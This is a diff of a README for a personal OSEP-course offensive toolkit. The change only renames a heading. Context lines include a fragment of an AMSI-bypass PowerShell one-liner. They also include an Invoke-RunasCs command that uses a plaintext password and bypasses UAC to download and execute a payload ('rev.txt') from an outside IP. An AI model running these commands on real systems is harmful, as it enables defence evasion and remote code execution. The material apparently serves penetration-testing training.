@@ -3,7 +3,7 @@ Just a bunch of tools built/gathered along the OSEP course.
 1. [Tunneling](#Tunneling)
 2. [MapTheNetwork](#MapTheNetwork)
 3. [AMSI-Bypass](#AMSI-Bypass)
-4. [Useful Basic Commands](#UsefulBasicCommands)
+4. [UsefulBasicCommands](#UsefulBasicCommands)
 
 
 # Tunneling
@@ -44,7 +44,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 
 
-# Useful Basic Commands:
+# UsefulBasicCommands:
 
 ### <ins>Run command as another user</ins>:
 - `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`
